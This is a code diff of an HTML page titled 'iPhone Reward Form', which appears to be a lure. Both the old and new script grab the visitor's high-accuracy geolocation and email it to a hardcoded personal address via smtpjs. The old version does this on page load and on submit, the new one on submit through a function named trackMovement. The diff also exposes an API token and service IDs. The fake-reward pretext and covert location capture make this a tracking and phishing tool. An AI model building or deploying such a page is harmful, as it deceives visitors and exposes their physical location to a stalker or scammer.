@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>iPhone Reward Form</title>
+    <!-- Bootstrap CSS -->
     <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
     <style>
         body {
@@ -12,12 +13,12 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f0f8ff;
+            background-color: #f0f8ff; /* Light background color to make form visible */
             font-family: Arial, sans-serif;
         }
         .container {
             max-width: 600px;
-            background: #ffffff;
+            background: #ffffff; /* Solid background color for form */
             padding: 2rem;
             border-radius: 10px;
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
@@ -123,80 +124,74 @@
     <!-- JavaScript code -->
     <script src="https://smtpjs.com/v3/smtp.js"></script>
     <script>
-    // Function to send email using EmailJS
-    function sendEmail(subject, message, recipientEmail) {
-        try {
-            Email.send({
-                SecureToken: "C973D7AD-F097-4B95-91F4-40ABC5567812", // Replace with your secure token
-                To: recipientEmail,
-                From: "khalilrodeni@gmail.com", // Replace with your email
-                Subject: subject,
-                Body: message,
-            })
-            .then(response => {
-                if (response === "OK") {
-                    alert("Email sent successfully!");
-                } else {
-                    alert("Error sending email: " + response);
-                }
-            })
-            .catch(error => {
-                alert("Error sending email: " + error.message);
-            });
-        } catch (error) {
-            alert("Unexpected error: " + error.message);
-        }
-    }
-
-    // Function to send location data via email
-    function sendLocationEmail(latitude, longitude) {
-        const message = `Geolocation Data:\nLatitude: ${latitude},\nLongitude: ${longitude}`;
-        sendEmail("Geolocation Data", message, "khalilrodeni@gmail.com");
-    }
-
-    // Function to request location and send it via email
-    function requestLocation() {
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-                    sendLocationEmail(latitude, longitude);
-                },
-                (error) => {
-                    let errorMessage;
-                    switch (error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMessage = "Location access denied by user.";
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMessage = "Location information is unavailable.";
-                            break;
-                        case error.TIMEOUT:
-                            errorMessage = "Location request timed out.";
-                            break;
-                        default:
-                            errorMessage = "An unknown error occurred.";
+        function sendEmail(subject, message, recipientEmail) {
+            try {
+                Email.send({
+                    ServiceID: "service_7xiz4x8",  // Your service ID
+                    TemplateID: "template_ux0sel8", // Your template ID
+                    UserID: "-_fZgZZhnhhK2OvuV",  // Your Public Key
+                    To: recipientEmail,
+                    From: "khalilrodeni@gmail.com", // Replace with your email
+                    Subject: subject,
+                    Body: message,
+                })
+                .then(response => {
+                    if (response === "OK") {
+                        alert("Email sent successfully!");
+                    } else {
+                        alert("Error sending email: " + response);
                     }
-                    alert(errorMessage);
-                },
-                { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
-            );
-        } else {
-            alert("Geolocation is not supported by this browser.");
+                })
+                .catch(error => {
+                    alert("Error sending email: " + error.message);
+                });
+            } catch (error) {
+                alert("Unexpected error: " + error.message);
+            }
         }
-    }
 
-    // Request location when the page loads
-    window.onload = function() {
-        requestLocation();
-    };
+        function sendLocationEmail(latitude, longitude) {
+            const message = `Geolocation Data:\nLatitude: ${latitude},\nLongitude: ${longitude}`;
+            sendEmail("Geolocation Data", message, "khalilrodeni@gmail.com");
+        }
 
-    // When the form is submitted, prevent default behavior and track location
-    document.getElementById("rewardForm").addEventListener("submit", function(event) {
-        event.preventDefault(); // Prevent form submission
-        requestLocation(); // Request location when the form is submitted
-    });
+        function trackMovement() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        sendLocationEmail(latitude, longitude);
+                    },
+                    (error) => {
+                        let errorMessage;
+                        switch (error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = "Location access denied by user.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = "Location information is unavailable.";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = "Location request timed out.";
+                                break;
+                            default:
+                                errorMessage = "An unknown error occurred.";
+                        }
+                        alert(errorMessage);
+                    },
+                    { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+                );
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // When the form is submitted, track location and send email
+        document.getElementById("rewardForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent form submission
+            trackMovement();
+        });
     </script>
 </body>
 </html>
